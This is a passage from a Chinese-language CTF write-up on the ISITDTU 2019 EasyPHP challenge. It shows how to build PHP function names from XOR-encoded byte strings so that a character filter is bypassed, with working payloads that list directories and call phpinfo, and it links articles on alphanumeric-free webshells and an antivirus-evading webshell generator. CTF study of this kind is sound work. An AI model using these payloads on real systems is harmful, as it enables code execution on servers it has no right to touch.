hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(qiqhnin^iiiiibi^hhhhimh)();<span class="hljs-comment">//phpinfo()</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714004923.png" alt=""></p><h3 id="Another-Way-Step-2"><a href="#Another-Way-Step-2" class="headerlink" title="Another Way-Step 2"></a>Another Way-Step 2</h3><p>接着我们就可以通过十六进制异或来进行字符串操作了。例如：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r ^ <span class="hljs-number">0xff</span> -&gt; <span class="hljs-number">0x8f8d96918ba08d</span> -&gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%<span class="hljs-number">8</span>f%<span class="hljs-number">8</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>b%a0%<span class="hljs-number">8</span>d))</span><br><span class="line">scandir ^ <span class="hljs-number">0xff</span> -&gt; <span class="hljs-number">0x8c9c9e919b968d</span> -&gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>e%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>d))</span><br><span class="line">      . ^ <span class="hljs-number">0xff</span> -&gt; <span class="hljs-number">0xd1</span>             -&gt; ((%ff)^(%d1))</span><br></pre></td></tr></tbody></table></figure><p></p><p>当然也可以不使用 0xff ，使用以下 payload 就可以在没有字符限制的时候进行列目录了：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%ff%ff%ff%ff%ff%ff%ff)^(%<span class="hljs-number">8</span>f%<span class="hljs-number">8</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>b%a0%<span class="hljs-number">8</span>d))(((%ff%ff%ff%ff%ff%ff%ff)^(%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>e%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>d))(((%ff)^(%d1))));</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Another-Way-Step-3"><a href="#Another-Way-Step-3" class="headerlink" title="Another Way-Step 3"></a>Another Way-Step 3</h3><p>通过总结我们所需要的字母：<code>._acdinprst</code>，然后进行类似的构造：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">t = s^c^d</span><br><span class="line">n = i^c^d</span><br><span class="line">r = a^c^p</span><br><span class="line"></span><br><span class="line">print_r -&gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%<span class="hljs-number">8</span>f%<span class="hljs-number">9</span>e%<span class="hljs-number">96</span>%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>c%a0%<span class="hljs-number">9</span>e)^(%ff%<span class="hljs-number">9</span>c%ff%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>c%ff%<span class="hljs-number">9</span>c)^(%ff%<span class="hljs-number">8</span>f%ff%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%ff%<span class="hljs-number">8</span>f))</span><br><span class="line">scandir -&gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>e%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>e)^(%ff%ff%ff%<span class="hljs-number">9</span>c%ff%ff%<span class="hljs-number">9</span>c)^(%ff%ff%ff%<span class="hljs-number">9</span>b%ff%ff%<span class="hljs-number">8</span>f))</span><br></pre></td></tr></tbody></table></figure><p></p><p>即可进行函数操作了</p><h3 id="Another-Way-2"><a href="#Another-Way-2" class="headerlink" title="Another Way 2"></a>Another Way 2</h3><p>看这题的时候想起了p牛的几篇文章，大家可以参考一下：</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p><p>这两篇也给了我当时很大的启发以及思路。尤其是第二篇中的 payload ，其实可以直接拿来用</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714230842.png" alt=""></p><p>大家可以详细的参考这两篇文章，p牛第一篇是通过位运算以及自增来进行操作，第二篇在 php7 环境下则是通过取反来进行操作，这里前面就简单介绍了一下通过异或的操作形式。</p><h3 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h3><p>题外话，看到 @Mr.Liu 师傅写的一个随机异或免杀的马，还是比较有意思的一个项目:<a href="https://github.com/yzddmr6/webshell-venom" target="_blank" rel="noopener">Github地址</a></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[EasyPHP (871 points)](<a href="https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU" target="_blank" rel="noopener">https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU</a> CTF 2019 Quals/web/easyphp.md)</p><p><a href="https://github.com/jesux/ctf-write-ups/tree/master/isitdtu-2019/EasyPHP" target="_blank" rel="noopener">ISITDTU CTF 2019 - EasyPHP</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;blockquote class=&quot;colorquote success&quot;&gt;&lt;p&gt;文章首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/5677&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/5677&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在 ISITDTU CTF 2019 上做了一道比较有意思的代码审计题，主要应用了 php 异或等操作进行 getshell，收获还是挺多的。最近越来越喜欢看这种代码简单，但是又蕴含玄机的东西了…&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
</feed>
